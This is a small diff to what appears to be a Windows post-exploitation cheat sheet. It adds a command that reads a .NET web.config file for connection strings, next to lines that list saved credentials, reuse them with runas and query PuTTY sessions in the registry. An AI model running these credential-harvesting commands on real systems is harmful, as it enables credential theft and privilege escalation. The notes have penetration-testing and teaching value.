@@ -79,6 +79,9 @@ cmdkey /list
 #use saved credentials
 runas /savecred /user:admin cmd.exe
 
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
 
